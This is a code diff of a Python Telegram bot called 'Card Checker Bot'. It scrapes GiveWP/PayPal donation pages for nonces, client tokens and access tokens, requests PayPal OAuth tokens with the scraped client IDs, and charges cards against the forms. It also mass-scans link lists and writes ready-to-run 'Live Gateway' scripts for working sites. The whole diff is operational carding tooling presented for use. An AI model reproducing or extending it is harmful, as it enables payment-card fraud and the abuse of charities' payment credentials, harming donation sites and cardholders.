@@ -1,11 +1,9 @@
 #!/usr/bin/env python3
 # =====================================================
-#  Card Checker Bot — FINAL v10 (Ultimate Extraction)
-#  - Extracts EVERYTHING from HTML + JS + iframes
-#  - Tries ALL auth methods (none/token/js/ajax/oauth)
-#  - Direct PayPal API fallback (Zero-Dependency)
-#  - Fast file generation
-#  - Smart refresh (only essential fields)
+#  Card Checker Bot — FINAL v11 (Real-time Display)
+#  - Real-time: shows LAST completed link + response
+#  - Not "Checking..." — shows the actual result
+#  - Fast transition between links
 #  - 200k+ stable, crash-proof
 # =====================================================
 import telebot
@@ -27,7 +25,6 @@ except:
     _UAS = [
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
         'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     ]
     def rand_ua(): return random.choice(_UAS)
 
@@ -289,7 +286,7 @@ class PayPalTester:
                 self.page_html = r.text
                 self.all_content = r.text
                 return True
-            time.sleep(0.5)
+            time.sleep(0.3)
         return False
 
     def _load_iframes(self):
@@ -304,7 +301,7 @@ class PayPalTester:
                     if ifu.startswith('//'): ifu = 'https:' + ifu
                     elif ifu.startswith('/'): ifu = f'https://{self.url}{ifu}'
                     elif not ifu.startswith('http'): ifu = f'https://{self.url}/{ifu}'
-                    r = self._safe_get(ifu, timeout=15)
+                    r = self._safe_get(ifu, timeout=12)
                     if r and r.status_code == 200 and r.text:
                         self.all_content += "\n" + r.text
                         if not self.id_form2:
@@ -314,7 +311,6 @@ class PayPalTester:
         except: pass
 
     def _load_all_js(self):
-        """Load ALL JS files (up to 15) — not just priority"""
         try:
             js_urls = re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', self.page_html)
             priority = [u for u in js_urls if any(k in u.lower() for k in ['give','donation','paypal','commerce','token','client','checkout'])]
@@ -332,42 +328,35 @@ class PayPalTester:
     def _extract_basic(self):
         try:
             c = self.all_content
-            # form-id-prefix
             for p in [r'name="give-form-id-prefix"\s+value="([^"]+)"',
                       r'"give-form-id-prefix"\s*:\s*"([^"]+)"',
                       r'data-form-id-prefix=["\']([^"\']+)["\']']:
                 m = re.search(p, c)
                 if m: self.id_form1 = m.group(1); break
-            # form-id
             for p in [r'name="give-form-id"\s+value="([^"]+)"',
                       r'"give-form-id"\s*:\s*"([^"]+)"',
                       r'"form_id"\s*:\s*"?(\d+)"?',
                       r'data-form-id=["\']([^"\']+)["\']']:
                 m = re.search(p, c)
                 if m: self.id_form2 = m.group(1); break
-            # nonce
             for p in [r'name="give-form-hash"\s+value="([^"]+)"',
                       r'"give-form-hash"\s*:\s*"([^"]+)"',
                       r'"nonce"\s*:\s*"([a-f0-9]{8,12})"',
                       r'name="_wpnonce"\s+value="([^"]+)"']:
                 m = re.search(p, c)
                 if m: self.nonec = m.group(1); break
-            # minimum
             m = re.search(r'name="give-form-minimum"\s+value="([^"]*)"', c)
             if m and m.group(1).strip(): self.minimum = m.group(1).strip()
-            # currency
             for p in [r'name="give-currency"\s+value="([A-Za-z]{3})"',
                       r'"give-currency"\s*:\s*"([A-Za-z]{3})"',
                       r'"currency"\s*:\s*"([A-Za-z]{3})"',
                       r'data-currency=["\']([A-Za-z]{3})["\']']:
                 m = re.search(p, c, re.IGNORECASE)
                 if m: self.currency = m.group(1).upper(); break
-            # price-id
             for p in [r'name="give-price-id"\s+value="([^"]+)"',
                       r'"give-price-id"\s*:\s*"([^"]+)"']:
                 m = re.search(p, c)
                 if m: self.current_price_id = m.group(1); break
-            # price_levels
             self.price_levels = []
             for pat, mode in [
                 (r'data-price-id=["\']([^"\']+)["\'][^>]*?data-price=["\']([\d.]+)["\']', 1),
@@ -384,18 +373,15 @@ class PayPalTester:
                 if (pid, amt) not in seen and amt > 0:
                     seen.add((pid, amt)); unique.append((pid, amt))
             self.price_levels = sorted(unique, key=lambda x: x[1])
-            # ajax_url
             if 'admin-ajax.php' in c:
                 self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
         except: pass
 
     def _extract_tokens_ultimate(self):
-        """Extract tokens from EVERY possible source"""
         if self.au: return True
         try:
             c = self.all_content
-
-            # ========== 1) data-client-token (base64 with JSON) ==========
+            # 1) data-client-token (base64 JSON)
             for p in [r'"data-client-token"\s*:\s*"([^"]+)"',
                       r'data-client-token=["\']([^"\']+)["\']',
                       r'"clientToken"\s*:\s*"([^"]+)"',
@@ -407,37 +393,31 @@ class PayPalTester:
                     try:
                         padded = enc + '=' * (-len(enc) % 4)
                         dec = base64.b64decode(padded).decode('utf-8', errors='ignore')
-                        # Access token
                         tm = re.search(r'"accessToken"\s*:\s*"([^"]+)"', dec)
                         if tm: self.au = tm.group(1)
-                        # Merchant
                         mm = re.search(r'merchant_id=([\w]+)', dec)
                         if mm: self.paypal = mm.group(1)
                         else:
                             mm = re.search(r'"merchantId"\s*:\s*"([^"]+)"', dec)
                             if mm: self.paypal = mm.group(1)
-                        # Client ID
                         cm = re.search(r'"clientId"\s*:\s*"([^"]+)"', dec)
                         if cm: self.client_id = cm.group(1)
-                        # Client Secret (rare but possible)
                         sm = re.search(r'"clientSecret"\s*:\s*"([^"]+)"', dec)
                         if sm: self.client_secret = sm.group(1)
                         if self.au: return True
                     except: pass
 
-            # ========== 2) accessToken in HTML/JS directly ==========
+            # 2) accessToken direct
             for p in [r'"accessToken"\s*:\s*"([^"]+)"',
                       r'accessToken["\']?\s*[:=]\s*["\']([^"\']{20,})["\']',
-                      r'"access_token"\s*:\s*"([^"]+)"',
-                      r'"A21[A-Za-z0-9+/=_-]{40,}"']:
+                      r'"access_token"\s*:\s*"([^"]+)"']:
                 m = re.search(p, c, re.IGNORECASE)
                 if m:
-                    val = m.group(1) if m.lastindex else m.group(0).strip('"')
-                    if len(val) > 20:
-                        self.au = val
+                    if len(m.group(1)) > 20:
+                        self.au = m.group(1)
                         return True
 
-            # ========== 3) A21 tokens (bare) ==========
+            # 3) A21 tokens
             for p in [r'"(A21[A-Za-z0-9+/=_-]{40,})"',
                       r"'(A21[A-Za-z0-9+/=_-]{40,})'",
                       r'\b(A21[A-Za-z0-9+/=_-]{40,})\b']:
@@ -446,7 +426,7 @@ class PayPalTester:
                     self.au = m.group(1)
                     return True
 
-            # ========== 4) JWT tokens (eyJ...) ==========
+            # 4) JWT
             for p in [r'"(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)"',
                       r"'(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)'"]:
                 m = re.search(p, c)
@@ -457,16 +437,13 @@ class PayPalTester:
                         if len(parts) >= 2:
                             padded = parts[1] + '=' * (-len(parts[1]) % 4)
                             payload = json.loads(base64.urlsafe_b64decode(padded))
-                            if 'accessToken' in payload:
-                                self.au = payload['accessToken']
-                            if 'clientId' in payload:
-                                self.client_id = payload['clientId']
-                            if 'merchant_id' in payload:
-                                self.paypal = payload['merchant_id']
+                            if 'accessToken' in payload: self.au = payload['accessToken']
+                            if 'clientId' in payload: self.client_id = payload['clientId']
+                            if 'merchant_id' in payload: self.paypal = payload['merchant_id']
                             if self.au: return True
                     except: pass
 
-            # ========== 5) client_id (standalone) ==========
+            # 5) client_id
             if not self.client_id:
                 for p in [
                     r'client-id=["\']([A-Za-z0-9_-]{20,})["\']',
@@ -480,29 +457,16 @@ class PayPalTester:
                         self.client_id = m.group(1)
                         break
 
-            # ========== 6) merchant_id (standalone) ==========
+            # 6) merchant_id
             if not self.paypal:
                 for p in [
                     r'merchant-id=["\']([A-Za-z0-9]+)["\']',
                     r'"merchantId"\s*:\s*"([A-Za-z0-9]+)"',
                     r'"merchant_id"\s*:\s*"([A-Za-z0-9]+)"',
-                    r'merchant_id=([A-Za-z0-9]+)',
                 ]:
                     m = re.search(p, c, re.IGNORECASE)
                     if m:
                         self.paypal = m.group(1)
-                        break
-
-            # ========== 7) client_secret (rare but possible) ==========
-            if not self.client_secret:
-                for p in [
-                    r'"clientSecret"\s*:\s*"([^"]+)"',
-                    r'"client_secret"\s*:\s*"([^"]+)"',
-                    r'client_secret["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-                ]:
-                    m = re.search(p, c, re.IGNORECASE)
-                    if m:
-                        self.client_secret = m.group(1)
                         break
         except: pass
         return bool(self.au)
@@ -510,21 +474,19 @@ class PayPalTester:
     def _try_oauth(self):
         if self.au or not self.client_id: return False
         try:
-            # Try with secret first
             if self.client_secret:
                 r = self.r.post('https://api-m.paypal.com/v1/oauth2/token',
                     auth=(self.client_id, self.client_secret),
-                    data={'grant_type': 'client_credentials'}, timeout=12)
+                    data={'grant_type': 'client_credentials'}, timeout=10)
                 if r.status_code == 200:
                     j = r.json()
                     if 'access_token' in j:
                         self.au = j['access_token']
                         return True
-            # Try without secret
             auth = base64.b64encode(f"{self.client_id}:".encode()).decode()
             r = self.r.post('https://api-m.paypal.com/v1/oauth2/token',
                 headers={'authorization': f'Basic {auth}', 'content-type': 'application/x-www-form-urlencoded'},
-                data={'grant_type': 'client_credentials'}, timeout=12)
+                data={'grant_type': 'client_credentials'}, timeout=10)
             if r.status_code == 200:
                 j = r.json()
                 if 'access_token' in j:
@@ -536,8 +498,7 @@ class PayPalTester:
     def _try_ajax_client_token(self):
         if self.au or not self.ajax_url or not self.id_form2: return False
         for action in ['give_paypal_commerce_get_client_token', 'get_client_token',
-                       'paypal_get_client_token', 'give_paypal_get_client_token',
-                       'ppcp_get_client_token', 'wc_ppcp_get_client_token']:
+                       'paypal_get_client_token', 'give_paypal_get_client_token']:
             try:
                 r = self.r.post(self.ajax_url, data={'action': action, 'form-id': self.id_form2},
                     headers={'user-agent': self.uu.random, 'x-requested-with': 'XMLHttpRequest'}, timeout=8)
@@ -552,12 +513,8 @@ class PayPalTester:
                                         j['data'].get('token') or 
                                         j['data'].get('access_token'))
                         if not token:
-                            token = (j.get('client_token') or 
-                                    j.get('token') or 
-                                    j.get('access_token'))
-                        
+                            token = (j.get('client_token') or j.get('token') or j.get('access_token'))
                         if token:
-                            # Try decode if base64
                             try:
                                 padded = token + '=' * (-len(token) % 4)
                                 dec = base64.b64decode(padded).decode('utf-8', errors='ignore')
@@ -566,10 +523,8 @@ class PayPalTester:
                                     self.au = tm.group(1)
                                     return True
                                 cm = re.search(r'"clientId"\s*:\s*"([^"]+)"', dec)
-                                if cm:
-                                    self.client_id = cm.group(1)
+                                if cm: self.client_id = cm.group(1)
                             except: pass
-                            # Direct token
                             if len(token) > 20:
                                 self.au = token
                                 return True
@@ -581,8 +536,7 @@ class PayPalTester:
         try:
             if not self.ajax_url: self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
             if not self.id_form2: return False
-            for action in ['give_get_form_nonce', 'give_donation_form_nonce',
-                           'give_get_nonce', 'give_form_nonce']:
+            for action in ['give_get_form_nonce', 'give_donation_form_nonce']:
                 r = self.r.post(self.ajax_url, data={'action': action, 'form_id': self.id_form2},
                     headers={'user-agent': self.uu.random, 'x-requested-with': 'XMLHttpRequest'}, timeout=6)
                 if r.status_code == 200 and r.text:
@@ -606,24 +560,19 @@ class PayPalTester:
             self._extract_basic()
             self._extract_tokens_ultimate()
 
-            if self.au:
-                self.auth_method = "token"
+            if self.au: self.auth_method = "token"
 
             if not self.au:
-                # Try harder — search again after all extraction
-                if self._extract_tokens_ultimate():
-                    self.auth_method = "token"
+                if self._extract_tokens_ultimate(): self.auth_method = "token"
 
             if not self.nonec and self.id_form2:
                 self._try_ajax_nonce()
 
             if not self.au and self.client_id:
-                if self._try_oauth():
-                    self.auth_method = "oauth"
+                if self._try_oauth(): self.auth_method = "oauth"
 
             if not self.au:
-                if self._try_ajax_client_token():
-                    self.auth_method = "ajax"
+                if self._try_ajax_client_token(): self.auth_method = "ajax"
 
             if not self.id_form1 and self.id_form2:
                 self.id_form1 = f"{self.id_form2}-1"
@@ -818,7 +767,7 @@ def check_single_link(link):
 
 
 # ============================================================
-#  Gateway generator — FAST + SMART REFRESH
+#  Gateway generator — FAST
 # ============================================================
 def generate_gateway_code(result, link, amount="1.00", tester=None):
     parsed = urlparse(link)
@@ -849,7 +798,7 @@ def generate_gateway_code(result, link, amount="1.00", tester=None):
     auth_method = _g('auth_method', 'none')
 
     return f'''#!/usr/bin/env python3
-# Live Gateway v10 — Fast Smart Refresh
+# Live Gateway v11 — Fast Smart Refresh
 # Link: {link}
 # Response: {display_result}
 # Amount: {amount} | Currency: {currency} | Auth: {auth_method}
@@ -934,22 +883,18 @@ class PayPal:
         self._refresh_count = 0
 
     def _refresh_fast(self):
-        """Fast refresh — nonce only + auth_method specific"""
         if self._refresh_count >= 3: return False
         self._refresh_count += 1
         try:
             r = self.r.get(PAGE_URL, headers={{'user-agent': self.uu.random}}, timeout=8)
             if r.status_code != 200: return False
             html = r.text
-            # Always refresh nonce (fast, essential)
             m = re.search(r'name="give-form-hash"\\s+value="([^"]+)"', html)
             if m: self.nonec = m.group(1)
             m = re.search(r'name="give-form-id-prefix"\\s+value="([^"]+)"', html)
             if m: self.id_form1 = m.group(1)
             m = re.search(r'name="give-form-id"\\s+value="([^"]+)"', html)
             if m: self.id_form2 = m.group(1)
-            
-            # Method-specific token refresh
             if AUTH_METHOD in ("token", "none"):
                 m = re.search(r'"data-client-token"\\s*:\\s*"([^"]+)"', html)
                 if m:
@@ -1189,7 +1134,7 @@ def file_check():
 
 def main():
     print("=" * 60)
-    print(f"  Live Gateway v10 — {{PREFERRED_AMT}} {{CURRENCY}}")
+    print(f"  Live Gateway v11 — {{PREFERRED_AMT}} {{CURRENCY}}")
     print(f"  Auth   : {{AUTH_METHOD}}")
     print(f"  Form   : {{ID_FORM2}} ({{ID_FORM1}})")
     print(f"  AJAX   : {{AJAX_URL}}")
@@ -1240,7 +1185,7 @@ def ali_al2(massege):
         tester = PayPalTester(link)
         tester.Key()
         result = tester.Charge(TEST_CARD)
-        print(f"[paypal] result: {result} | amount: {tester.donation} | auth: {tester.auth_method} | token: {'YES' if tester.au else 'NO'}")
+        print(f"[paypal] result: {result} | amount: {tester.donation} | auth: {tester.auth_method}")
 
         if not is_live_response(result):
             safe_edit_message(chat_id, ko.message_id,
@@ -1405,15 +1350,21 @@ def _run_mass_job(chat_id, user_id, links, start_idx, progress):
     status_msg = safe_send_message(chat_id,
         f"📊 <b>Mass Scan Started</b>\n📌 Total: {total}\n⏳ Starting...")
 
-    current_link = [""]
-    current_response = [""]
+    # ✅ Real-time state: LAST COMPLETED link + response
+    last_link = [""]
+    last_response = [""]
+    last_live = [False]
     live_counter = [live]
+    current_state = {"status": "starting"}
 
     def status_updater():
+        """Updates every 1.5 seconds — shows LAST COMPLETED link"""
         while mass_active.get(user_id, False):
             try:
                 if not status_msg:
-                    time.sleep(2); continue
+                    time.sleep(1.5)
+                    continue
+                
                 pct = int((processed / total) * 100) if total > 0 else 0
                 elapsed = time.time() - started_at
                 spd = processed / elapsed if elapsed > 0 else 0
@@ -1421,27 +1372,38 @@ def _run_mass_job(chat_id, user_id, links, start_idx, progress):
                 bar_len = 20
                 filled = int((pct / 100) * bar_len)
                 bar = '█' * filled + '░' * (bar_len - filled)
-                link_display = current_link[0][:60] if current_link[0] else "..."
-                resp_display = current_response[0][:60] if current_response[0] else "..."
-                safe_edit_message(chat_id, status_msg.message_id,
-                    f"📊 <b>Mass Scan</b>\n"
-                    f"━━━━━━━━━━━━━━━━━━\n"
-                    f"📌 Total: {total}\n"
-                    f"✅ Live: {live}\n"
-                    f"❌ Dead: {dead}\n"
-                    f"⏳ {pct}% {bar}\n"
-                    f"━━━━━━━━━━━━━━━━━━\n"
-                    f"🔗 <b>Current:</b>\n"
-                    f"<code>{link_display}</code>\n"
-                    f"💬 <b>Response:</b>\n"
-                    f"<code>{resp_display}</code>\n"
-                    f"━━━━━━━━━━━━━━━━━━\n"
-                    f"⚡ Speed: {spd:.1f}/s\n"
-                    f"⏱️ ETA: {int(eta/60)}m {int(eta%60)}s\n"
-                    f"━━━━━━━━━━━━━━━━━━\n"
-                    f"🛑 /stop | ♻️ /resume")
+                
+                # ✅ Show LAST COMPLETED link + response
+                if last_link[0]:
+                    link_display = last_link[0][:65]
+                    resp_display = last_response[0][:65]
+                    live_icon = "✅" if last_live[0] else "❌"
+                    last_section = f"{live_icon} <b>Last Checked:</b>\n<code>{link_display}</code>\n💬 <b>Response:</b>\n<code>{resp_display}</code>"
+                else:
+                    last_section = "⏳ Waiting for first result..."
+                
+                # Show current state
+                if current_state["status"] == "checking":
+                    checking_section = "🔄 <i>Checking next link...</i>"
+                else:
+                    checking_section = "⏸️ <i>Idle</i>"
+                
+                text = f"""📊 <b>Mass Scan</b>
+━━━━━━━━━━━━━━━━━━
+📌 Total: {total}
+✅ Live: {live}
+❌ Dead: {dead}
+⏳ {pct}% {bar}
+━━━━━━━━━━━━━━━━━━
+{last_section}
+━━━━━━━━━━━━━━━━━━
+{checking_section}
+⚡ Speed: {spd:.1f}/s | ETA: {int(eta/60)}m {int(eta%60)}s
+🛑 /stop | ♻️ /resume"""
+                
+                safe_edit_message(chat_id, status_msg.message_id, text)
             except: pass
-            time.sleep(2)
+            time.sleep(1.5)
 
     threading.Thread(target=status_updater, daemon=True).start()
 
@@ -1457,23 +1419,33 @@ def _run_mass_job(chat_id, user_id, links, start_idx, progress):
                 break
 
             link = links[idx]
-            current_link[0] = link
-            current_response[0] = "Checking..."
+            current_state["status"] = "checking"
 
             try:
                 result = check_single_link(link)
             except Exception as e:
                 result = {'link': str(link)[:100], 'live': False, 'respons': f'Error: {str(e)[:50]}', 'tester': None}
 
-            current_response[0] = str(result.get('respons', 'Unknown'))[:100]
             processed += 1
+
+            # ✅ Store LAST COMPLETED link + response for display
+            resp_text = str(result.get('respons', 'Unknown'))[:100]
+            is_live = result.get('live', False)
+            
+            # Normalize display
+            if 'ORDER_NOT_APPROVED' in resp_text.upper() or 'PAYER_CANNOT_PAY' in resp_text.upper():
+                resp_text = "Payer cannot pay for this transaction."
+            
+            last_link[0] = link
+            last_response[0] = resp_text
+            last_live[0] = is_live
 
             try:
                 with open(results_file, 'a', encoding='utf-8') as f:
                     f.write(f"{link} => {result.get('respons', 'unknown')}\n")
             except: pass
 
-            if result and result.get('live'):
+            if is_live:
                 live += 1
                 live_counter[0] += 1
                 try:
@@ -1486,15 +1458,12 @@ def _run_mass_job(chat_id, user_id, links, start_idx, progress):
                     with open(gateway_path, 'w', encoding='utf-8') as f:
                         f.write(code)
 
-                    display = result['respons']
-                    if 'ORDER_NOT_APPROVED' in display.upper() or 'PAYER_CANNOT_PAY' in display.upper():
-                        display = "Payer cannot pay for this transaction."
                     cur = tester.currency if tester else 'USD'
                     auth = tester.auth_method if tester else 'none'
 
                     caption = f"""✅ <b>Live #{live_counter[0]}</b>
 🔗 <code>{result['link'][:80]}</code>
-💬 {str(display)[:80]}
+💬 {resp_text[:80]}
 💰 ${result.get('amount', '1.00')} | 💱 {cur} | 🔐 {auth}"""
 
                     safe_send_document(chat_id, gateway_path, caption=caption)
@@ -1505,14 +1474,17 @@ def _run_mass_job(chat_id, user_id, links, start_idx, progress):
             else:
                 dead += 1
 
+            # Save progress every 50
             if processed % 50 == 0:
                 progress['processed'] = processed
                 progress['live'] = live
                 progress['dead'] = dead
                 save_progress(user_id, progress)
 
-            time.sleep(0.15)
+            current_state["status"] = "moving"
+            time.sleep(0.1)  # ← Very short pause before next
 
+        # Final
         mass_active[user_id] = False
         time.sleep(2)
 
